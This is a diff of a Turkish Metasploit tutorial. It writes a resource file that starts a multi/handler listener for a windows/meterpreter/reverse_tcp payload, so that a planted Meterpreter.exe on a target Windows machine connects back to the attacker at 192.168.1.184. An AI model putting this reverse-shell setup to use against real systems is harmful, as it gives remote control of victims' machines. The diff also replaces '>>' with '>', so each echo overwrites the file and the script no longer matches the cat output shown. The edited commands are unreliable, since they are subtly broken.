@@ -47,11 +47,11 @@ Saved as: Meterpreter.exe
 Gerekli .exe dosyamız oluşturuldu. Bu dosya hedef windows işletim sistemi içinde çalışacak ve yerel bilgisayara iletişim sağlayacaktır. O zaman bizim yerel bilgisayarda dinleyici oluşturmamız gerekmektedir. Dinleyicimizi oluşturalım.
 ```bash
 root@kali:~# touch meterpreter.rc
-root@kali:~# echo use exploit/multi/handler **>>** meterpreter.rc
-root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp **>>** meterpreter.rc
-root@kali:~# echo set LHOST 192.168.1.184 **>>** meterpreter.rc
-root@kali:~# echo set ExitOnSession false **>>** meterpreter.rc
-root@kali:~# echo exploit -j -z **>>** meterpreter.rc
+root@kali:~# echo use exploit/multi/handler > meterpreter.rc
+root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp > meterpreter.rc
+root@kali:~# echo set LHOST 192.168.1.184 > meterpreter.rc
+root@kali:~# echo set ExitOnSession false > meterpreter.rc
+root@kali:~# echo exploit -j -z > meterpreter.rc
 root@kali:~# cat meterpreter.rc
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
